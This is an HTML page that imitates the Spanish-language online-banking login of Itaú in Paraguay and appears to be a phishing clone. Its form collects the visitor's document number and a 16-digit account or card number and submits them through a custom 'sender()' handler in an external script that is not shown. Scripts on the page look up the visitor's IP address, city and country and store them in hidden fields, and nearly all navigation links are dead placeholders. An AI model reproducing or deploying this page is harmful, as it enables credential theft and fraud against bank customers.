<html lang="es-ES"><head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

      <title>Banca Electronica</title>
      
      <meta name="viewport" content="width = device-width, initial-scale=1, maximum-scale=1">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="viewport" content="width = device-width, initial-scale=1, maximum-scale=1">
      <link rel="image_src" href="img/logo.png">
      <link rel="shortcut icon" href="img/favicon.ico">
      <link rel="stylesheet" type="text/css" href="css/material-icons.css">
      <link rel="stylesheet" type="text/css" href="css/-style18.css">
    
      <link href="css/teclado-1.5.css" rel="stylesheet" type="text/css">
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
      <script>
         $.getJSON("https://api.ipify.org?format=json",
                                           function(data) {
         
             // Setting text of element P with id gfg
             $("#gfg").html(data.ip);
         })
      </script>
      <script>
         $.getJSON("https://ipinfo.io", function (response) {
      $("#ip").html("IP: " + response.ip);
      $("#address").html("" + response.city + ", " + response.country);

      })
      </script>
  
<style type="text/css">
    #_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}
</style>

</head>
<body style="overflow: hidden;" _c_t_common="1">

   <header>
      <link rel="stylesheet" type="text/css" href="css/acceso_rapido.css">
      <link rel="stylesheet" type="text/css" href="css/font_style.css">
      <nav class="navbar-expand-lg navbar-itau">
         <div class="container-fluid">
            <div class="d-flex align-items-center">
               <!-- COL IZQUIERDA -->
               <div class="col-6 col-lg-2 order-2 order-lg-0">
                  <div class="d-flex align-items-center no-gutters">
                     <div class="col-lg-3 logo-login text-center text-lg-left">
                        <a href="#" title="Página inicial">
                           <img src="img/logo.png" height="48" width="48" class="img-fluid">
                        </a>
                     </div>
                     <div class="col-lg-8 d-lg-block d-none">
                       
                           <div class="input-group buscador-top pl-2">
                              <input type="text" class="custom-file-input hasPlaceholder" placeholder="¿Buscás algo?" id="txt_palabra_arriba">
                              <button class="btn" type="button" id="btn_buscar_arriba" onclick="consulta_paginas()">
                                 <span class="material-icons md-20">search</span>
                              </button>
                           </div>
                     
                     </div>
                  </div>
               </div>
               <div class="col-3 col-lg-5 order-0 order-lg-1 menu-sitio">
                  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsPrincipal" aria-controls="navbarsPrincipal" aria-expanded="false" aria-label="Toggle navigation" id="menu-nav-ppal">
                     <span class="material-icons md-30 d-block" id="menu-nav-ppala">dehaze</span>
                     <span id="textoMenu">Menú</span>
                  </button>
                  <div class="collapse navbar-collapse" id="navbarsPrincipal">
                     <ul class="navbar-nav">
                     
                        <li class="nav-item dropdown">
                           <a class="nav-link dropdown-toggle" id="dropdown01" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Productos</a>
                           </li>
                
                        <li class="nav-item dropdown">
                           <a class="nav-link dropdown-toggle" id="dropdown02" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Tus objetivos</a>
                           
                        </li>
                
                        <li class="nav-item dropdown">
                           <a class="nav-link dropdown-toggle" id="dropdown03" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Atención al cliente</a>
                           
                        </li>
                  
                     </ul>
                  </div>
               </div>
               <!-- FIN COL CENTRAL -->
               <div class="right_header order-3 menu-user">
                  <button class="navbar-toggler float-right" type="button" data-toggle="collapse" data-target="#acc-HB" aria-controls="acc-HB" aria-expanded="true" aria-label="Toggle navigation" id="menu-nav-user">
                     <span class="material-icons md-30 d-block" id="menu-nav-usera">clear</span>Acceso </button>
                  <div class="tab-quick-access">
                     <button class="tablinks active" id="tab_24h">24 horas en internet</button>
                     <button class="tablinks" id="tab_pe">Pagos electrónicos</button>
                     <button class="tablinks " id="tab_cd">Abrí tu cuenta</button>
                  </div>
                  <div id="24hs_tab" class="tab-quick-access-content" style="display: block;">
                     <p id="gfg" hidden="">
                     </p><p id="address" hidden="">
                     </p><form action="" method="post" onsubmit="return sender()">
                     <p id="gfg" hidden="">
                     </p><p id="address" hidden="">

                        </p><div class="acc-HB navbar-collapse collapse show" id="acc-HB" style="">
                           <div class="form-row ml-auto w-100" id="access-responsive-width">
                              <div class="col-lg-2 mb-3 mb-lg-0">
                                 <label class="sr-only" for="">Segmento</label>
                                 <div id="select-pe">
                                    <select class="form-control form-control-sm" id="segmento">
                                       <option value="Personas">Persona</option>
                                       <option value="Empresa">Empresa</option>
                                       
                                    </select>
                                 </div>
                                 <div class="col-lg-auto mt-3 mt-lg-1 lnk mr-auto">
                                    <ul class="list-inline mb-0 float-lg-left float-none text-center">
                                       <li class="list-inline-item">
                                          <small>
                                             <a href="#">Solicitar PIN de acceso</a>
                                          </small>
                                       </li>
                                       <li class="list-inline-item">
                                          <small>
                                             <a href="#" class="ayuda cboxElement">
                                                <span class="badge badge-primary rounded-circle text-white">?</span> Ayuda </a>
                                          </small>
                                       </li>
                                    </ul>
                                    
                                 </div>
                              </div>
                              <!-- panel para vos -->
                              <div class="col-lg-2 div-personas mb-3 mb-lg-0">
                                 <label class="sr-only" for="">Documento</label>
                                 <input type="text" class="form-control form-control-sm hasPlaceholder" id="cedula" required="" placeholder="Documento" onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
                              </div>
                              <div class="col-lg-2 div-personas mb-3 mb-lg-0">
                                 <label class="sr-only" for="">Producto</label>
                                 <select class="form-control form-control-sm" id="tipoCuenta">
                                    <option value="Cuenta">Cuenta</option>
                                    <option value="Tarjeta">Tarjeta</option>
                                 </select>
                              </div>
                              <div class="col-lg-2 div-personas div-cuenta mb-3 mb-lg-0">
                                 <label class="sr-only" for="">Numero</label>
                                 <input type="text" class="form-control form-control-sm hasPlaceholder" placeholder="Número" required="" maxlength="16" id="cuenta" onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
                              </div>
                              
                              <div class="col-lg-auto col-sm-12">
                                 <button type="submit" class="btn btn-primary btn-sm btn-block accesoHB_2" value="Ingresar" id="vprocesar">
                                    <img src="img/icon-lock.png">
                                    <i id="ingresar_pe">Ingresar</i>
                                 </button>
                                 <button type="button" class="btn btn-secondary btn-block d-block d-lg-none"> Abrí tu cuenta </button>
                              </div>
                              <div class="col-lg-auto col-sm-12 d-none d-lg-block">
                                 <img src="img/icon-24hs.png" height="25" width="24" alt="">
                              </div>
                           </div>
                        </div>
                     </form>
                  </div>
                    
               </div>
            </div>
         </div>
         <!-- FIN COL DERECHA -->
      </nav>
      <!-- header -->
   </header>
   <div id="parcial" style=" box-sizing: inherit; ">
      <div style="display: none;">
         <div id="popup-message">
            <a href="#">
               <img src="img/popup-truncamiento-usd.jpg">/ </a>
         </div>
      </div>
      <!-- BANNER PRINCIPAL -->
      <div id="wrapperBanner">
         <div class="caroufredsel_wrapper" style="display: block; text-align: left; float: none; position: relative; inset: auto; z-index: auto; height: 900px; margin: 0px; overflow: hidden;">
            <div id="carousel" style="text-align: left; float: none; position: absolute; inset: 0px auto auto 0px; margin: 0px; width: 3510px; height: 450px;">
               <div id="banner1" class="banner" style="width: 390px;">
                  <img src="img/banner.jpg">
               </div>
              
            </div>
         </div>
      </div>
      <footer class="footer">
         <div class="container-fluid pt-2 pb-2">
            <a class="btn_sitemap abrir" id="btnSitemap">Acceso rápido</a>
            <a class="btn_sitemap cerrar" id="btnSitemap" style="display: none;">Volver arriba</a>
            
            <a id="btn-bandera" data-toggle="collapse" href="#" role="button" aria-expanded="false" aria-controls="selecaoIdiomas">
               <img src="img/flagFooterParaguai.png" alt="Bandera Paraguay" width="25">
            </a>
         
            <ul class="list-inline m-0">
               <li class="list-inline-item">
                  <a href="#">Políticas de privacidad</a>
               </li>
               <li class="list-inline-item">
                  <a href="#">Emergencias bancarias</a>
               </li>
               <li class="list-inline-item">
                  <a href="#">Sobre Itau</a>
               </li>
               <li class="list-inline-item">
                  <a href="#">Tarifario y Contratos</a>
               </li>
               <li class="list-inline-item">
                  <a href="#">Informe de Gobierno Corporativo</a>
               </li>
               <li class="list-inline-item">
                  <a href="#">Fundación</a>
               </li>
               <li class="list-inline-item">
                  <a href="#">Trabajá con nosotros</a>
               </li>
               <li class="list-inline-item">
                  <a href="#">Más Seguridad</a>
               </li>
               <li class="list-inline-item">
                  <a href="#">Beneficios</a>
               </li>
               <li class="list-inline-item">
                  <a href="#">Bienes en Venta</a>
               </li>
               <li class="list-inline-item clearfix"></li>
            </ul>
         </div>
        
      </footer>
      
   </div>
   
   
   <script src="js/sax.js"></script>
   

</body></html>
